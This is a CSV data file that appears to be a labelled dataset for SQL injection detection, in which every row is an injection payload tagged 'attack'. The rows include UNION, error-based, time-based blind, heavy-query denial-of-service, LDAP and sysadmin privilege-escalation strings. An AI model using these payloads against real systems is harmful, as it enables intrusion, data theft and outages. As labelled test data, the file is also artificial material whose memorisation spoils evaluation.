sentence,attack_type_code,attack_type,len_payload
"1%"" and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""%"" = """,1,attack,286
"1%""  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #",1,attack,72
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""aAvw"" = ""aAvw",1,attack,114
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 2185 = 2185",1,attack,255
' )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND  ( 'WeUQ' = 'WeUQ,1,attack,278
"1%'  )  )   )  union all select null,null,null--",1,attack,48
"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",1,attack,74
"1'+ ( select pwvr where 3028 = 3028 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,attack,119
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'tKoF' = 'tKoF",1,attack,312
1 )  union all select null--,1,attack,28
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 5867 = 5867",1,attack,281
"1'+ ( select pxsd where 2576 = 2576 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666  )  )  +'",1,attack,157
"  )  )   UNION ALL SELECT NULL, NULL, NULL# AND   (  (  8786 = 8786",1,attack,65
"1  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  1402 = 1402",1,attack,298
"1'|| ( select 'dukt' where 3206 = 3206 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  ||'",1,attack,206
"' UNION ALL SELECT NULL, NULL, NULL#",1,attack,36
1'  )  )   )  and  ( 5995 = 9618 ) *9618 and   (  (   ( 'nagr' like 'nagr,1,attack,73
"1 and elt ( 4249 = 4249,7259 ) ",1,attack,30
"-9007 )  as gill where 6462 = 6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",1,attack,97
1 )  as tbve where 4828 = 4828,1,attack,30
"-5925 )  where 5758 = 5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",1,attack,89
'; WAITFOR DELAY '0:0:5';-- AND 'lDTn' LIKE 'lDTn,1,attack,49
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'jgfG' = 'jgfG",1,attack,330
1 )  as gbtj where 8175 = 8175,1,attack,30
"1"" and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,attack,43
"1"" where 1809 = 1809 and make_set ( 8403 = 8403,8899 ) --",1,attack,57
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",1,attack,115
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'JJti' = 'JJti",1,attack,216
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'cGQX' LIKE 'cGQX",1,attack,339
1' )  as znak where 5203 = 5203,1,attack,31
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""UCTY"" = ""UCTY",1,attack,146
"1"" and sleep ( 5 ) #",1,attack,20
"1 where 2674 = 2674 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,attack,125
%2A%28%7C%28objectclass%3D%2A%29%29,1,attack,35
"1"" )  as eoer where 8667 = 8667 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --",1,attack,84
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,attack,291
"-6307' where 8916 = 8916 union all select 8916,8916,8916,8916,8916,8916,8916--",1,attack,78
' )  AND 1492 = 4010-- AND  ( 'IggO' = 'IggO,1,attack,44
"""  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( ""nqAF"" = ""nqAF",1,attack,338
"-3829%"" )  union all select 2218,2218,2218,2218,2218,2218,2218--",1,attack,64
new question ' select * from polls_question,1,attack,43
" select * from users where id = 1 or ""@;"" = 1 or 1 = 1 -- 1",1,attack,58
"1""  )  )   )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (   ( ""rsru"" = ""rsru",1,attack,95
"-6368' union all select 6529,6529,6529--",1,attack,40
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""vGRV"" = ""vGRV",1,attack,329
 ELSE 2182* ( SELECT 2182 FROM mysql.db )  END  )  )  ,1,attack,51
"-4639""  )  )   )  or 8550 = 9348",1,attack,32
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,319
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""dmEP"" = ""dmEP",1,attack,307
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'Jogg' LIKE 'Jogg",1,attack,106
"1""  )  )   and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  ""ycuo"" like ""ycuo",1,attack,144
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'DZil' LIKE 'DZil",1,attack,278
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND 'FgLj' = 'FgLj",1,attack,67
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'pkfe' = 'pkfe",1,attack,276
" UNION ALL SELECT 1,2,3,4,5,6,7,8-- ",1,attack,34
""" )  AND 9217 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND  ( ""noxZ"" = ""noxZ",1,attack,282
"1%'  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( '%' = '",1,attack,249
select  ( case when  ( 5856 = 7176 )  then 5856 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,attack,115
'-',1,attack,3
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""RRAY"" = ""RRAY",1,attack,235
"1' )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( 'pgyl' = 'pgyl",1,attack,102
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""SBwG"" LIKE ""SBwG",1,attack,94
"1 )  as zdym where 1578 = 1578 union all select null,null,null#",1,attack,63
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""FuOm"" LIKE ""FuOm",1,attack,202
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'nkte' = 'nkte",1,attack,117
-9541 where 4291 = 4291 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ,1,attack,254
"-9656"" union all select 8735,8735--",1,attack,35
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'wTvk' = 'wTvk",1,attack,270
"1'  )  )   and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (  'obeh' = 'obeh",1,attack,93
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",1,attack,59
-8753 )  order by 1#,1,attack,20
"1'  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  'pcim' = 'pcim",1,attack,302
"1%""  )  )   )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( ""%"" = """,1,attack,148
"-6335""  )  )   )  union all select 3654--",1,attack,41
" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,attack,310
"s, ) s: select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1",1,attack,68
"s,{s: select * from users where id = 1 or "",{"" or 1 = 1 -- 1",1,attack,60
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and  ( 'fnon' like 'fnon",1,attack,111
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 5903 = 5903",1,attack,197
"1 )  as mnyy where 4409 = 4409 union all select null,null,null,null--",1,attack,69
-5152'  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr (,1,attack,255
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""jXcc"" LIKE ""jXcc",1,attack,274
"' AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND 'akJb' = 'akJb",1,attack,277
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  ""vKOm"" LIKE ""vKOm",1,attack,171
select case when 8514 = 3207 then 1 else null end--,1,attack,51
"1'  )  )   or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (  'skdm' = 'skdm",1,attack,152
-4389'  )  )   )  or  ( 1139 = 3499 ) *3499 and   (  (   ( 'qoch' = 'qoch,1,attack,73
"1'+ ( select rwse where 9843 = 9843 union all select null,null,null,null,null,null,null--",1,attack,89
" select * from users where id = 1 or 1#""$ union select null,version (  )  -- 1",1,attack,77
"1""  )  )   )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( ""tkkg"" = ""tkkg",1,attack,126
"select count ( * )  from generate_series ( 1,5000000 )  and ""xcjt"" = ""xcjt",1,attack,74
" select * from users where id = 1 or ""$["" or 1 = 1 -- 1",1,attack,54
"1' )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,attack,192
"1 )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( 6786 = 6786",1,attack,79
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'nBDz' LIKE 'nBDz",1,attack,250
1%'  )  )   )  or sleep ( 5 ) #,1,attack,31
1s,1,attack,2
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 'wlne' LIKE 'wlne",1,attack,137
s&on&: select * from users where id = '1' or \<$ or 1 = 1 -- 1',1,attack,63
"exec sp_addsrvrolemember 'name' , 'sysadmin'",1,attack,44
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""qprR"" = ""qprR",1,attack,308
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  'RfIK' = 'RfIK",1,attack,173
"1""  )  )   as yfpl where 4820 = 4820 union all select null,null,null,null,null,null,null--",1,attack,90
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  4367 = 4367",1,attack,192
"1"" )  as ikdo where 4128 = 4128",1,attack,31
"1""  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,attack,119
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,attack,306
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""uwQh"" = ""uwQh",1,attack,161
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  ""hdMm"" = ""hdMm",1,attack,336
"-9860 )  where 8743 = 8743 union all select 8743,8743,8743,8743,8743,8743,8743--",1,attack,80
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 6365 = 6365",1,attack,177
  )  )   AND 9217 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (  4008 = 4008,1,attack,286
" ( updatexml ( 8862,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 8862 = 8862,1  )  )   ) ,0x717a767a71 ) ,8981  )  )  ",1,attack,116
 end and   (  (  6874 = 6874,1,attack,27
1' )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ,1,attack,108
"""  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( ""cyAH"" LIKE ""cyAH",1,attack,75
"1' )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( 'qvrd' = 'qvrd",1,attack,240
select  ( case when  ( 3140 = 4625 )  then 1 else 3140* ( select 3140 from master..sysdatabases )  end ) --,1,attack,107
1'  )  )   as bewk where 3672 = 3672 or sleep ( 5 ) --,1,attack,54
"-3518 )  union all select 1877,1877,1877,1877#",1,attack,46
"-9928""  )  )   union all select 7511,7511,7511,7511,7511,7511,7511,7511#",1,attack,72
"1 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) # vojr",1,attack,254
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'XcqR' = 'XcqR",1,attack,330
 else dbms_lock.sleep ( 0 ) ,1,attack,26
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  ""VOqQ"" LIKE ""VOqQ",1,attack,285
1  )  )   as rvex where 3462 = 3462 and 4595 = 4595#,1,attack,52
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""pIEP"" LIKE ""pIEP",1,attack,140
1'|| ( select 'xlmt' where 1664 = 1664,1,attack,38
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""ukJN"" = ""ukJN",1,attack,271
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'PDnG' = 'PDnG",1,attack,312
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""XGkC"" = ""XGkC",1,attack,263
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""pYZj"" = ""pYZj",1,attack,221
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  'xiyl' like 'xiyl",1,attack,116
" ( select * from generate_series ( 3906,3906,case when  ( 3906 = 3906 )  then 1 else 0 end )  limit 1 ) ",1,attack,102
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""HxiN"" = ""HxiN",1,attack,108
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual#",1,attack,102
"1 or benchmark(10000000,MD5(1))#",1,attack,32
"1' )  as ibqr where 5372 = 5372 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,attack,129
"-1707 )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ",1,attack,254
"1%' and elt ( 4249 = 4249,7259 )  and '%' = '",1,attack,45
"1"" )  where 5129 = 5129 order by 1--",1,attack,36
"1'  )  )   or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  'cdaq' like 'cdaq",1,attack,155
